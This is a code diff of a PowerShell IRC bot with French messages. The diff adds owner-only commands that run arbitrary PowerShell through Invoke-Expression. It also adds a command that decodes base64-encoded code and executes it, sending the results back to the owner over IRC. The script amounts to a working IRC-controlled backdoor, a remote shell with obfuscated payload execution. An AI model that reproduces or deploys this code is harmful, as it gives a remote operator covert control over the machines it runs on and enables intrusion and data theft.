@@ -53,31 +53,55 @@ do {
     $read = $reader.ReadLine();
     write-host $read  
 
+    $user = $read.Split("!")[0]
 
-
-
-    if ($read -like '*stop_powershell*') {
-        if($read -like '*' + $owner + '*') {
+    if(($read.Split("!")[0]) -like ':' + $owner) {
+        if ($read -like '*stop_powershell*') {
             $writer.WriteLine("QUIT")
             $read = $reader.ReadLine();
             write-host $read
             break
-        } else {
-            $writer.WriteLine("PRIVMSG #script-powershell :spece de battard tu va pas m'etteindre comme ca")
         }
-
-    }
-    if ($read -like '*command_bot*') {
-        if($read -like '*' + $owner + '*') {
-            $value = $read -split "command_bot "
+        if ($read -like '*command_irc*') {
+            $value = $read -split "command_irc "
             Write-host $value[1]
             $writer.WriteLine($value[1])
         }
+        if ($read -like '*:command_ps*') {
+            $value = $read -split "command_ps "
+            $command = $value[1]
+
+            try {
+                $result = Invoke-Expression $command
+                $writer.WriteLine("PRIVMSG " + $owner + " :" + $result)
+            } catch {
+                $writer.WriteLine("PRIVMSG " + $owner + " :La commande suivante a echoue --> " + $command)
+            }
+
+        }
+        if ($read -like '*:command_code*') {
+            $value = $read -split "command_code "
+            $code = $value[1]
+
+            try {
+                write-host $code
+
+                $decoded = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($code))
+                
+                $result = Invoke-Expression $decoded
+                $writer.WriteLine("PRIVMSG " + $owner + " :" + $result)
+            } catch {
+                $writer.WriteLine("PRIVMSG " + $owner + " :Le code suivante a echoue --> " + $code)
+            }
+
+        }
+
+
     }
 
     if ($read -like '*' + $hostname + '*') {
         $writer.WriteLine("PRIVMSG " + $owner + " :" + $read)
-        sleep(0.1)
+        Start-Sleep -Milliseconds 150
     }
 
 
